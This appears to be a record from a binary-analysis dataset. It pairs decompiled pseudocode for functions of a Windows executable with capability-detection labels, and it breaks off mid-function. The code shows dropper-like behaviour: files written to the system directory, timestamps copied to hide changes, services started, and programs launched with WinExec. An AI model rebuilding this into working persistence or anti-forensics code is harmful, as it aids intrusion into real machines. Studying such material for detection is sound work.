{
    "00401030": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004010ca) overlaps instruction at (ram,0x004010c9)\n// \n// WARNING: Removing unreachable block (ram,0x0040122b)\n// WARNING: Removing unreachable block (ram,0x00401238)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401030(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uchar uVar3;\n    uchar uVar4;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = &var_213h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = 0;\n    *(puVar1 + 2) = 0;\n    s = 0;\n    puVar1 = &var_10fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = 0;\n    var_ch = 1;\n    *(puVar1 + 2) = 0;\n    uVar3 = 0;\n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar3) || (!uVar3)) {\n        puVar1 = &var_8h;\n        arg_8h_00 = &var_4h;\n    }\n    else {\n        arg_8h = arg_8h + -1;\n        puVar1 = func_0x1018703c();\n        uVar4 = 0;\n        arg_8h_00 = &stack0x4d8df841;\n    }\n    fcn.004034f0(arg_8h_00, puVar1);\n    if ((!uVar4) && (uVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar2 = fcn.00402ad0();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.00403150(&s, var_4h, var_8h);\n    if (iVar2 != 0) {\n        fcn.004032a0();\n        iVar2 = fcn.00404a90(0x40707c);\n        if ((iVar2 != -1) || (iVar2 = fcn.00404a90(0x407070),  iVar2 != -1)) {\n            iVar2 = fcn.00401000(arg_8h);\n            if (iVar2 != 0) {\n                fcn.00401fb0();\n                fcn.00404430();\n                return 1;\n            }\n            if (*0x42273c == 0) {\n                return 0;\n            }\n        }\n        iVar2 = fcn.004029d0(arg_8h, &s);\n        if (iVar2 == 0) {\n            var_ch = 0;\n        }\n        if ((var_ch != 0) && (iVar2 = fcn.004048c0(arg_8h),  iVar2 == 0)) {\n            var_ch = 0;\n        }\n        if (var_ch == 0) {\n            var_ch = fcn.00404910(arg_8h, 0);\n        }\n        if (var_ch != 0) {\n            fcn.00404430();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        (*_sym.imp.KERNEL32.dll_WinExec)();\n        return var_ch;\n    }\n    return 0;\n}\n",
        "token_count": 938
    },
    "004013a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004013a0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x40705c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00404880(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1155
    },
    "00402390": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023ce) overlaps instruction at (ram,0x004023cd)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040252f)\n// WARNING: Removing unreachable block (ram,0x004024c4)\n// WARNING: Removing unreachable block (ram,0x0040252d)\n// WARNING: Removing unreachable block (ram,0x0040253c)\n// WARNING: Removing unreachable block (ram,0x00402542)\n// WARNING: Removing unreachable block (ram,0x00402498)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402390(void)\n\n{\n    unkbyte6 Var1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar4;\n    bool bVar5;\n    uint *puVar6;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    if ((0x7f < &stack0xfffffffc && *0x10 != 0x84) && (0x7f >= &stack0xfffffffc || *0x10 == 0x84)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar4 = unaff_EDI;\n    puVar6 = unaff_ESI;\n    iVar3 = unaff_EBX;\n    iVar2 = fcn.004047f0();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar5 = false;\n    fcn.00404b70();\n    if (((bVar5) || (!bVar5)) &&\n       (unaff_EDI = puVar4,  unaff_ESI = puVar6,  unaff_EBX = iVar3,  iVar3 = fcn.00404a90(0x407088),  iVar3 == -1)) {\n        fcn.00403e10();\n        *0x422740 = 1;\n        iVar3 = fcn.00403260();\n        if (iVar3 != 0) {\n            return 0;\n        }\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar4 = &var_1fh;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar4 = &var_80h + 1;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar4 = &var_60h + 1;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        puVar4 = &var_40h + 1;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        iVar3 = fcn.00402790(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.00402ca0(&var_20h);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.00401030(&var_80h, &var_60h, &var_20h, &var_40h);\n        return iVar3 != 0;\n    }\n    *unaff_EDI = *unaff_ESI;\n    Var1 = *(unaff_EBX + 0xc000098);\n    *(unaff_EDI + 0x62) = *(unaff_EDI + 0x62);\n    return Var1;\n}\n",
        "token_count": 1089
    },
    "00402740": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402751) overlaps instruction at (ram,0x0040274d)\n// \n\nulong __cdecl fcn.00402740(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    uint8_t *in_EDX;\n    \n    *in_EDX = *in_EDX | in_ECX >> 8;\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)();\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "00403070": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403070(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00404a90(0x407090);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 221
    },
    "00403260": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00403260(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404880(0x407024);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00404620": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404631) overlaps instruction at (ram,0x0040462f)\n// \n\nvoid fcn.00404620(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    unkbyte3 Var3;\n    uchar *puVar4;\n    uint8_t uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t extraout_ECX;\n    uint *puVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    ushort in_SS;\n    uchar uVar14;\n    uchar uVar15;\n    uint8_t in_AF;\n    uchar uVar16;\n    uchar uVar17;\n    ulong uVar18;\n    uint *apuStack272 [67];\n    char cVar9;\n    \n    puVar12 = &stack0xfffffffc;\n    uVar14 = &stack0xfffffffc < 0x10c;\n    uVar17 = SBORROW4(&stack0xfffffffc, 0x10c);\n    uVar16 = *0x10 == 0x110;\n    uVar15 = (POPCOUNT(apuStack272 & 0xff) & 1U) == 0;\n    puVar4 = &stack0xfffffffc;\n    if (uVar17) goto code_r0x00404644;\n    do {\n        puVar4 = puVar12;\n        if (uVar17) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x00404644:\n        puVar12 = puVar4;\n        puVar13 = *(puVar12 + 0x20);\n        iVar8 = *(puVar12 + 0x1c);\n        iVar11 = *(puVar12 + 0x18);\n        uVar18 = fcn.00402630(iVar11, iVar8, *(puVar12 + 8), 0x20, puVar13 + 8);\n        puVar10 = uVar18 >> 0x20;\n        uVar6 = uVar18;\n        if ((uVar15) || (!uVar15)) {\n            uVar7 = *(puVar12 + 0xc);\n            puVar10 = puVar13 + 0x18;\n        }\n        else {\n            apuStack272[0] = puVar13 + 1;\n            out(*puVar13, uVar18 >> 0x20);\n            do {\n                cVar9 = uVar6 >> 8;\n                in_AF = 9 < (uVar6 & 0xf) | in_AF;\n                Var3 = CONCAT21(uVar6 >> 0x10, cVar9 - in_AF);\n                uVar5 = -in_AF;\n                uVar6 = CONCAT31(Var3, uVar5);\n            } while (in_AF || cVar9 == *puVar10);\n            piVar1 = iVar8 + puVar10 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x75) = uVar6;\n            puVar12 = puVar12 + 1;\n            uVar14 = 0;\n            uVar17 = 0;\n            uVar7 = CONCAT31(Var3, uVar5) | 0x8d;\n            uVar16 = (uVar5 | 0x8d) == 0;\n            uVar15 = (POPCOUNT(uVar5 | 0x8d) & 1U) == 0;\n            puVar13 = apuStack272[0];\n        }\n        fcn.00402630(iVar11, iVar8, uVar7, 0x20, puVar10);\n        if ((uVar15) || (!uVar15)) goto code_r0x004046aa;\n        puVar2 = segment(in_SS, *0x10 + -0x144);\n        uVar7 = *puVar2;\n        if (uVar14) goto code_r0x004046cb;\n    } while (uVar15);\n    uVar14 = 0;\n    uVar16 = *0x10 == 0x140;\ncode_r0x004046aa:\n    uVar7 = fcn.00402630(iVar11, iVar8, *(puVar12 + 0x10), 0x20, puVar13 + 0x28);\n    if ((uVar16) || (!uVar16)) {\ncode_r0x004046d2:\n        fcn.00402630(iVar11, iVar8, *(puVar12 + 0x14), 0x20, puVar13 + 0x38);\n        iVar8 = fcn.004045d0();\n        if (iVar8 != -1) {\n            iVar11 = *(puVar12 + 0x20);\n            *(iVar11 + 0x120) = iVar8;\n            goto code_r0x0040472a;\n        }\n        uVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n    }\n    else {\n        iVar11 = iVar11 + 1;\n        uVar16 = iVar11 == 0;\ncode_r0x004046cb:\n        if (!uVar14 && !uVar16) {\n            in_AF = 9 < (uVar7 & 0xf) | in_AF;\n            piVar1 = (uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - iVar11;\n            puVar13 = puVar13 + 1;\n            goto code_r0x004046d2;\n        }\n    }\n    iVar11 = *(puVar12 + 0x20);\n    *(iVar11 + 0x120) = uVar7 % 5;\ncode_r0x0040472a:\n    puVar12[-0x10c] = 0;\n    puVar10 = puVar12 + -0x10b;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar12 + -4) = 0x104;\n    *(puVar10 + 2) = 0;\n    iVar8 = fcn.00404440();\n    if ((iVar8 != 0) && (iVar8 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar8 == 0)) {\n        *(iVar11 + 0x120) = *(iVar11 + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 1543
    },
    "00404a90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404a90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x422764)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x422768)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x00404b5a:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar1 == 0) {\n            var_8h = var_128h;\n            iVar1 = var_4h;\n            goto code_r0x00404b5a;\n        }\n        iVar2 = (**0x42276c)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 385
    },
    "00402580": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402580(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00402ca0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402cf0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.00402ca0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint unaff_ESI;\n    uint *puVar2;\n    uchar uVar3;\n    uint64_t uVar4;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    uVar3 = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puVar2 = &s;\n    (*_sym.imp.MSVCRT.dll_sprintf)(puVar2, 0x407038, &lpBuffer, arg_8h);\n    if ((!uVar3) && (uVar3)) {\n        *puVar2 = unaff_ESI;\n        return CONCAT44(0x104, unaff_ESI);\n    }\n    fcn.00404da0(&var_4h, &var_8h);\n    fcn.00402df0(var_4h);\n    uVar4 = fcn.00403150(&s, var_4h, var_8h);\n    if (uVar4 == 0) {\n        return uVar4 & 0xffffffff00000000;\n    }\n    fcn.004013a0(&s, 0xffffffff);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 524
    },
    "00403350": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.00403350(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "004012f0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401304) overlaps instruction at (ram,0x00401302)\n// \n\nint32_t __cdecl fcn.004012f0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t unaff_ESI;\n    bool in_SF;\n    \n    if ((in_SF) || (!in_SF)) {\n        unaff_ESI = arg_8h;\n    }\n    if (arg_10h != 0) {\n        arg_8h = arg_10h;\n        do {\n            unaff_ESI = unaff_ESI + *arg_ch;\n            if (unaff_ESI >> 0x10 != 0) {\n                unaff_ESI = (unaff_ESI >> 0x10) + (unaff_ESI & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return (unaff_ESI >> 0x10) + unaff_ESI;\n}\n",
        "token_count": 251
    },
    "00403570": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035fc) overlaps instruction at (ram,0x004035fb)\n// \n\nvoid fcn.00403570(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char extraout_CL;\n    uchar *unaff_EBX;\n    uchar *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    puVar6 = &stack0xfffffffc;\n    uVar3 = fcn.004012f0(0, param_1, param_2 + 1U >> 1);\n    puVar7 = uVar3;\n    iVar4 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar5 = *(iVar4 + 0x58);\n    if (SBORROW1(extraout_CL, '\\x01')) {\ncode_r0x004035fc:\n        bVar8 = uVar3 < uVar5;\n        if (bVar8) {\n            if (bVar8) {\ncode_r0x00403622:\n                iVar4 = -uVar5;\n            }\n            else {\n                if (!bVar8) goto code_r0x00403622;\n                uVar2 = uVar5;\n                cVar1 = uVar2 - *param_1;\n                iVar4 = -1;\n                func_0x10189594((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *param_1) * 0x800 | (in_IF & 1) * 0x200 |\n                                (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *param_1 |\n                                (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                (in_AC & 1) * 0x40000);\n                LOCK();\n                puVar6 = unaff_EBX;\n            }\n            iVar4 = (puVar7 + iVar4 & 0xffffU) - 1;\n            goto code_r0x0040362b;\n        }\n        uVar5 = uVar5 & 0xffff;\n    }\n    else if (!SBORROW1(extraout_CL, '\\x01')) goto code_r0x004035fc;\n    *param_1 = *puVar7;\n    *0xffff = *0xffff | &stack0xffffffe4;\n    iVar4 = puVar7 + (4 - (uVar5 + 1));\n    puVar6 = &stack0xfffffffc;\ncode_r0x0040362b:\n    *(puVar6 + 8) = iVar4;\n    iVar4 = *(puVar6 + 8);\n    uVar5 = *(puVar6 + -4) >> 0x10;\n    if (iVar4 < *(puVar6 + -4) >> 0x10) {\n        iVar4 = (iVar4 - uVar5 & 0xffff) - 1;\n        *(puVar6 + 8) = iVar4;\n    }\n    else {\n        iVar4 = iVar4 - uVar5;\n    }\n    **(puVar6 + 0x14) = iVar4 + *(puVar6 + 0xc);\n    **(puVar6 + 0x10) = *(*(puVar6 + -8) + 0x58);\n    return;\n}\n",
        "token_count": 912
    },
    "00401fe0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401fe0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x422740 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401f50(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072f8, acStack1304, &uStack2112);\n    uStack2088 = 0x407380;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            